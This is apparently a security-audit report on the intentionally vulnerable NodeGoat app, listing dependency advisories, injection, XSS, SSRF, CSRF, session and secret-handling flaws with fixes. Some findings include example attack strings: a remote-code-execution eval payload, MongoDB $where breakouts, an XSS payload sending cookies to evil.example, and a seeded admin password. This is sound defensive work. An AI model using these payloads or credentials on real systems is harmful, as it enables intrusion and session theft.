evidence: package.json declares nodemon ^1.19.1; the lockfile resolves node_modules/nodemon to 1.19.1 (current nodemon major is 3.x). npm audit reports the file-watcher chain chokidar -> anymatch -> micromatch -> braces with GHSA-grv7-fg5c-xmjg ("Uncontrolled resource consumption in braces", high, fixed <3.0.3), and separately update-notifier -> boxen -> ... -> cross-spawn with GHSA-3xgq-45jj-v275 (ReDoS, high). nodemon is invoked by this repo's `npm run dev` script (package.json scripts block) to watch and restart the server during development.
impact: A crafted filename or glob pattern in the watched directory tree could trigger catastrophic backtracking in nodemon's file-matcher during local development; this does not affect the deployed application, which does not run nodemon.
fix: Upgrade nodemon to a current major version (npm audit reports a fix is available, though it is a semver-major bump).

title: selenium-webdriver 2.53.3 (devDependency) pulls adm-zip and tmp packages with DoS and path-traversal advisories
evidence: package.json declares selenium-webdriver ^2.53.2; the lockfile resolves node_modules/selenium-webdriver to 2.53.3 (current major is 4.x). npm audit reports this pulls adm-zip with GHSA-xcpc-8h2w-3j85 ("crafted ZIP file triggers 4GB memory allocation", high, fixed <0.6.0) and GHSA-7q85-xj36-vmfc (uncontrolled memory allocation, high, fixed <0.6.1), and tmp with GHSA-ph9p-34f9-6g65 (path traversal via unsanitized prefix/postfix, high, fixed <0.2.6). This is a devDependency used for browser-automation tests, not part of the running application.
impact: A crafted ZIP artifact processed by this old adm-zip during a test run could exhaust memory on the test runner (CI); this does not reach production traffic.
fix: Upgrade selenium-webdriver to a current major version (npm audit reports a semver-major fix is available).

title: zaproxy 0.2.0 (devDependency) pulls a lodash and a fully-deprecated request package, each with critical advisories
evidence: package.json declares zaproxy ^0.2.0; the lockfile resolves node_modules/zaproxy to 0.2.0. npm audit reports this pulls lodash (10 advisories including critical prototype pollution GHSA-jf85-cpcp-j695) and request (itself deprecated, pulling form-data's critical unsafe-boundary advisory GHSA-fjxv-7rqg-78g4 and an SSRF advisory GHSA-p8p7-x288-28g6). zaproxy is a devDependency wrapping the OWASP ZAP security-scanning API; I read the audit chain but did not trace whether this project's own scripts call the specific vulnerable lodash/request functions, hence `likely`.
impact: This is a dev/CI-only exposure: a compromised or malicious ZAP scan response processed by this vulnerable request/lodash chain could affect whatever machine runs the security scan, not the deployed application.
fix: Upgrade zaproxy (npm audit reports a semver-major fix, to 2.0.0-rc.7, is available) to pick up patched lodash and to drop the deprecated request package.

title: Server-side code injection via eval() of the preTax contribution field
evidence: app/routes/index.js:52 wires POST /contributions to contributionsHandler.handleContributionsUpdate with only the isLoggedIn middleware (no input validation). That handler reads req.body.preTax directly into eval() at this line with no sanitization, allowlist, or type check beforehand; the only checks (isNaN, < 0, sum > 30) run afterwards, on the already-evaluated result.
impact: Any authenticated user can submit a POST /contributions request with preTax set to arbitrary JavaScript (e.g. "require('child_process').execSync('id')") which runs with the full privileges of the Node.js server process, yielding remote code execution.
fix: Replace eval(req.body.preTax) with Number(req.body.preTax) or parseInt(req.body.preTax, 10) and reject non-numeric input before use.

title: Server-side code injection via eval() of the afterTax contribution field
evidence: Same handler and route as the preTax finding (app/routes/index.js:52 -> handleContributionsUpdate). req.body.afterTax reaches eval() directly with no sanitization on this path; validation happens only after the value has already been evaluated.
impact: Any authenticated user can submit POST /contributions with afterTax set to arbitrary JavaScript, achieving remote code execution in the server process.
fix: Replace eval(req.body.afterTax) with Number(req.body.afterTax) or parseInt(req.body.afterTax, 10) and reject non-numeric input before use.

title: Server-side code injection via eval() of the roth contribution field
evidence: Same handler and route as the preTax finding (app/routes/index.js:52 -> handleContributionsUpdate). req.body.roth reaches eval() directly with no sanitization on this path; validation happens only after the value has already been evaluated.
impact: Any authenticated user can submit POST /contributions with roth set to arbitrary JavaScript, achieving remote code execution in the server process.
fix: Replace eval(req.body.roth) with Number(req.body.roth) or parseInt(req.body.roth, 10) and reject non-numeric input before use.

title: NoSQL injection in allocations lookup via unsanitized $where threshold
evidence: app/routes/index.js:63 wires GET /allocations/:userId to allocationsHandler.displayAllocations. app/routes/allocations.js:19-23 reads threshold straight from req.query.threshold and passes it unmodified to allocationsDAO.getByUserIdAndThreshold. That function's searchCriteria() (this file, lines 60-84) interpolates threshold verbatim into a $where JavaScript-evaluated MongoDB query string; the commented-out lines 63-76 show the intended fix (parseInt + range check) was disabled, leaving the raw string path active. allocationsCol.find() at line 86 executes this query.
impact: Any logged-in user can break out of the single-quoted string in the $where clause (e.g. threshold="0'; while(true){}; var x='" or "0'; return true; var x='") to run arbitrary JavaScript inside the MongoDB server for every document scanned, enabling data exfiltration across users or denial of service.
fix: Drop $where entirely and use a native query operator, e.g. { userId: parsedUserId, stocks: { $gt: parseInt(threshold, 10) } }, after validating threshold is a bounded integer.

title: Open redirect on /learn takes the target URL from the query string unchecked
evidence: The GET /learn route handler (app/routes/index.js:70-73) passes req.query.url directly to res.redirect() with no allowlist, same-origin check, or path validation.
impact: An attacker can craft a link to https://<app-host>/learn?url=https://evil.example that the target trusts because it originates from the legitimate domain, enabling phishing or OAuth token theft.
fix: Validate the target against an allowlist of known-safe relative paths (or a same-origin check) before calling res.redirect(), and reject or default otherwise.

title: Server-side request forgery in research lookup builds the fetch URL from query parameters
snippet:
const url = req.query.url + req.query.symbol;
                return needle.get(url, (error, newResponse, body) => {
evidence: displayResearch (app/routes/research.js:12-16), wired to GET /research behind only isLoggedIn (app/routes/index.js:76), concatenates req.query.url and req.query.symbol with no scheme, host, or destination validation and passes the result straight to needle.get(), which issues the outbound HTTP request from the server.
impact: Any authenticated user can make the server issue requests to arbitrary hosts, including internal-only services, cloud metadata endpoints (e.g. 169.254.169.254), or localhost-bound admin interfaces, and the response body is echoed back verbatim in res.write(body) at line 25, turning the SSRF into a proxy for reading internal service responses.
fix: Validate req.query.url against an allowlist of permitted external hosts/schemes before issuing the request, or route the lookup through a fixed, server-controlled base URL plus a validated symbol parameter instead of a fully attacker-supplied URL.

title: Reflected XSS in profile update error page via unescaped lastName (and sibling fields)
snippet: <input type="text" class="form-control" id="lastName" name="lastName" value="{{lastName}}" placeholder="Enter last name">
evidence: server.js:135-137 calls swig.setDefaults({ autoescape: false }), which disables HTML escaping for every {{ }} interpolation in every swig template app-wide. app/routes/profile.js:42-50 destructures lastName (and ssn, dob, address, bankAcc, bankRouting) straight from req.body, and when the bankRouting regex check fails (lines 61-76) re-renders the profile view passing that raw, unmodified lastName back in, which this line outputs unescaped inside a double-quoted HTML attribute.
impact: An attacker who submits a crafted lastName such as "\"><script>document.location='//evil.example/c?'+document.cookie</script>" together with an invalid bankRouting value gets it reflected unescaped into the response, executing in the victim's session and allowing session-cookie theft (the same unescaped pattern also applies to ssn, dob, address, bankAcc and bankRouting on the surrounding lines).
fix: Re-enable swig's default autoescape (remove the autoescape: false override in server.js) and/or explicitly HTML-escape user-supplied values before interpolating them into attribute contexts.

title: Stored XSS risk in memos: markdown-rendered user content is output with template autoescaping disabled
evidence: app/routes/memos.js:11-16 stores req.body.memo verbatim via memosDAO.insert with no server-side HTML sanitization of the raw text. app/routes/memos.js:19-33 then re-lists every stored memo and renders this template, which passes doc.memo through marked() (configured with only { sanitize: true } in server.js:126-129) and outputs the result unescaped, since swig's global autoescape is disabled (server.js:137, see the profile.html finding). I did not read marked 0.3.5's own source to confirm whether its sanitize option fully blocks every vector (e.g. javascript: URIs in markdown links/images are a known historical bypass class for that option), so I stopped short of calling this confirmed.
impact: If marked's sanitize option does not neutralize a given payload (e.g. a markdown link with a javascript: href), any user's memo text becomes stored HTML/script rendered to every user who views the shared memo list, enabling session hijacking or defacement for all viewers.
fix: Re-enable swig autoescape globally, and additionally run the marked() output through a maintained HTML sanitizer (e.g. DOMPurify server-side or sanitize-html) rather than relying solely on marked's built-in sanitize flag, which is deprecated upstream.

title: No security-header middleware is mounted; helmet is disabled at the require line
evidence: helmet is a listed dependency in package.json but its require is commented out here. The whole block that would apply it (lines 38-65) is also commented: app.disable("x-powered-by"), helmet.frameguard() (clickjacking), helmet.noCache(), helmet.contentSecurityPolicy(), helmet.hsts(), and the dont-sniff-mimetype nosniff() call are all dead code. The live middleware stack that follows (favicon at line 68, bodyParser at 71-75, session at 78, static assets at 121) sets no security headers at all, so responses ship with none of CSP, X-Frame-Options, HSTS, X-Content-Type-Options, or a hidden X-Powered-By.
impact: Responses are open to clickjacking (no frame-ancestors/X-Frame-Options), MIME-sniffing based content-type confusion, no CSP to contain any XSS that does occur, and the framework fingerprint (X-Powered-By: Express) is exposed to attackers for targeted exploitation.
fix: Uncomment and mount helmet() early in the middleware stack (before routes), configure a real Content-Security-Policy, and call app.disable("x-powered-by").

title: CSRF protection is fully commented out even though templates already expect a token
evidence: csurf is a package.json dependency but its require is disabled here, and the middleware that would mount it and expose res.locals.csrftoken (server.js lines 104-113: app.use(csrf()) and the res.locals.csrftoken = req.csrfToken() handler) is entirely commented out. app/views/login.html line 117 still renders <input type="hidden" name="_csrf" value="{{csrftoken}}" />, but session.js never passes a csrftoken variable to any render() call, so csrftoken is always undefined and no token is ever generated or checked. Every state-changing POST route registered in app/routes/index.js (/login, /signup, /profile, /contributions, /benefits, /memos) relies only on the session cookie for authentication, with no origin or token check.
impact: A page on any other origin can submit a cross-site form to these POST routes; a logged-in victim's browser will attach the session cookie automatically, letting an attacker change the victim's profile, contributions, benefits allocation or post memos on their behalf.
fix: Uncomment csurf() and the res.locals.csrftoken assignment, mount it before the routes, and confirm every render() call that serves a form passes csrftoken.

title: Session cookie's secure attribute is left commented out, so the cookie is not marked HTTPS-only
evidence: The session() options object passed at server.js:78-102 has no `cookie` property at all — this whole block, which would set httpOnly and secure, is commented out. express-session's own default (secure: false) therefore applies, so the session cookie is sent over any connection, encrypted or not. This compounds with the server only listening over plain HTTP (server.js:145).
impact: The session cookie can be intercepted or replayed by anyone on the network path since the browser is never told to withhold it from plaintext connections.
fix: Uncomment the cookie block, set secure: true once the app is served over HTTPS, and add sameSite: "lax" or "strict".

title: Session cookie keeps the express-session default name instead of a generic one
evidence: The `key: "sessionId"` option is commented out and not present anywhere else in the session() call at server.js:78-102, so express-session falls back to its documented default cookie name `connect.sid`.
impact: The default cookie name fingerprints the app as Express to any observer, aiding attackers in selecting known Express/session-based attack tooling.
fix: Uncomment `key: "sessionId"` (or another generic, non-framework-identifying name) in the session() options.

title: Swig template auto-escaping is disabled, so reflected user input renders unescaped
evidence: swig.setDefaults sets autoescape: false globally for every .html template registered as the view engine at server.js:116-118. app/routes/session.js's handleLoginRequest (lines 53-90) reads the raw, unvalidated req.body.userName and, on an invalid-username error, renders it back via res.render("login", { userName: userName, ... }) (line 83). app/views/login.html:110 emits it verbatim: value="{{userName}}". With autoescape disabled, a userName like `"><script>alert(1)</script>` breaks out of the value attribute and executes in the submitter's browser.
impact: Reflected cross-site scripting on the login form (and any other template rendering user-influenced data) lets an attacker run arbitrary JavaScript in the victim's session, including stealing the (non-secure, non-sameSite) session cookie.
fix: Remove autoescape: false (restore swig's default of true) and re-verify templates that relied on raw HTML output use an explicit |safe filter only where content is trusted.

title: Global error handler renders the raw Error object into the response
evidence:
The caught `err` object (from any route or DB call that calls next(err), e.g. app/routes/session.js:100, :210, :222) is passed whole into the error-template view. app/views/error-template.html:11 renders it directly: `
{{error}}`. Because swig autoescape is disabled (server.js:137), this prints err's message unescaped straight to the client instead of a generic message; the underlying stack trace is also logged to the console at error.js:8 but the message content itself still reaches the browser.
impact: Internal error messages (which for a MongoDB-backed app can include driver/library detail) are exposed to end users, aiding attackers in fingerprinting the stack and crafting further attacks; combined with the disabled autoescape, an error message containing markup would also execute as HTML/JS.
fix: Render a generic message plus a correlation id to the client, and keep the full error (message and stack) only in the server-side log.

title: Environment selection defaults to development when NODE_ENV is unset, shipping debug scripts
evidence: When NODE_ENV is not set, config falls back to config/env/development.js, which injects a livereload <script> into every page via `environmentalScripts` (development.js:9-13, consumed at app/views/layout.html:125-127 and login.html:145-147) and embeds a ZAP API key (development.js:6). docker-compose.yml:7 declares `NODE_ENV:` with no value, so a deployment started with `docker-compose up` without NODE_ENV explicitly exported on the host inherits this development fallback rather than production.js. I did not trace an actual deployed environment's variables, so I mark this likely rather than confirmed.
impact: A production-like deployment that forgets to export NODE_ENV=production serves a livereload script pointing at a hardcoded dev port to every visitor and keeps development-only settings active.
fix: Make the default fail closed (default to "production" or refuse to start) instead of defaulting to "development", and pin NODE_ENV=production in docker-compose.yml / the deployment environment.

owasp: A09:2021 Security Logging and Monitoring Failures
title: Full application config, including the session secret, is written to stdout on every startup
evidence: config.js builds `config` at line 10 as the merge of config/env/all.js (which contains cookieSecret and cryptoKey, see config/env/all.js:8-9) and the environment file, then line 12-13 unconditionally logs a label and the full object via util.inspect with no depth limit and no redaction, so cookieSecret and cryptoKey appear in plaintext in whatever captures process stdout (container logs, PM2/forever logs, a log aggregator) every time the process starts.
impact: Anyone with read access to the application's stdout/log stream (ops tooling, a misconfigured log aggregator, a shared hosting log file) obtains the session-signing secret and crypto key without needing source access, widening who can exploit the session-forgery issue above.
fix: Remove the console.log of the full config object, or redact known-sensitive keys (cookieSecret, cryptoKey) before logging, and never log a secrets object at INFO level in production.

title: Database seed script hard-codes a plaintext admin password that the app compares directly at login
evidence: artifacts/db-reset.js defines USERS_TO_INSERT with an admin user (userName "admin", isAdmin: true, line 15-20) whose password field is the plaintext literal "Admin_123" (the bcrypt-hash alternative on line 19 is commented out). This script is not a dormant fixture: docker-compose.yml line 9 runs `node artifacts/db-reset.js` as part of the container's startup command before `npm start`, and app.json line 13 runs the same script as the Heroku `postdeploy` hook, so the documented deployment paths insert this exact admin account into the live database. app/data/user-dao.js validateLogin() (lines 57-67) compares the stored password to the submitted one with plain `fromDB === fromUser`, i.e. the stored plaintext password is the working login credential, not a hash to be replaced later.
impact: Anyone who deploys NodeGoat via the documented docker-compose or Heroku path — or anyone who simply knows this public repository — can log in as the admin user with userName "admin" / password "Admin_123" and reach every admin-only function the app exposes.
fix: Never seed a real deployment with a fixed credential; generate a random admin password at first boot (or require an operator-supplied one via environment variable/secret store), hash it with bcrypt before storing (the code to do so already exists commented out in this file and in app/data/user-dao.js), and force a password change on first login.

title: A real RSA private key is committed to the repository under artifacts/cert/server.key
snippet:
-----BEGIN RSA PRIVATE KEY-----
[REDACTED PRIVATE KEY BODY]
-----END RSA PRIVATE KEY-----
evidence: artifacts/cert/server.key is a well-formed PEM RSA private key committed in cleartext to the repository (not gitignored: .gitignore has no rule for artifacts/ or *.key). server.js lines 18-27 and 149-155 show the matching httpsOptions block that reads this exact file (`fs.readFileSync(path.resolve(__dirname, "./artifacts/cert/server.key"))`) and starts an HTTPS listener with it, but that block is currently commented out — the running server only calls http.createServer (line 145) — so the key is not wired into the live listener today. It is however shipped as the paired artifacts/cert/server.crt/server.key that the code's own documented HTTPS fix expects to load verbatim.
impact: Anyone with a clone of this repository holds the private key matching artifacts/cert/server.crt. If an operator follows the code's own commented-out instructions to enable HTTPS with this shipped key pair (a plausible path since the files are provided together for that purpose), any client traffic to that HTTPS listener can be decrypted or man-in-the-middled by anyone who has ever cloned the repo.
fix: Remove the committed private key from the repository and its history, generate TLS keys per deployment (or via a certificate manager / Let's Encrypt) outside version control, and if this key/cert pair was ever used for a real deployment, revoke and reissue it.

title: Hard-coded AES key committed in config; the code that would use it to encrypt SSN/DOB is currently commented out
evidence: config/env/all.js sets cryptoKey to a literal string alongside cryptoAlgo: "aes256" (line 10). The only code that reads config.cryptoKey, app/data/profile-dao.js lines 15-40 (createIV/encrypt/decrypt using crypto.createCipheriv/createDecipheriv with config.cryptoKey), is wrapped in a block comment, and the call sites that would invoke encrypt()/decrypt() on ssn/dob (profile-dao.js lines 67-76 and 100-105) are commented out too, so as shipped this key encrypts nothing at runtime. The identical key also appears as example code in app/views/tutorial/a6.html (the in-app tutorial teaching this exact 'fix'), meaning a developer who follows the tutorial and uncomments the code would put this hard-coded key into live use for encrypting SSN and date-of-birth fields.
impact: No impact today since the consuming code path is disabled. If the documented in-app tutorial fix is applied as written (uncommenting profile-dao.js), all PII (SSN, DOB) would be encrypted with this single hard-coded, publicly-known key, letting anyone with repository access decrypt every user's stored SSN/DOB.
fix: If/when the encryption fix is enabled, derive cryptoKey from an environment variable or secrets manager rather than a literal, and never ship the same tutorial key as both documentation and a usable default.

title: OWASP ZAP proxy API key is hard-coded in dev/test config and used by the security test suite
evidence: development.js and config/env/test.js both set zapApiKey to the identical literal, alongside zapHostName: "192.168.56.20" (a private/internal test-network address) and zapPort: "8080". test/security/profile-test.js line 28 reads `config.zapApiKey` and passes it as the ZAP API key argument to every zaproxy.* call (newSession, spider.scan, context.includeInContext, forcedUser.*, htmlreport, etc., lines 87-260), i.e. it is the live credential this security test suite uses to drive a local ZAP proxy instance.
impact: The key only authenticates to a local/internal OWASP ZAP instance used for automated security testing (not a production system, database, or user data), so exposure lets someone who can already reach that internal ZAP instance on the 192.168.56.20 test network drive scans through it. Low impact, but it is the same literal duplicated across two committed config files.
fix: Generate the ZAP API key per test run (or read it from an environment variable / CI secret) instead of committing a fixed value shared by development.js and test.js.
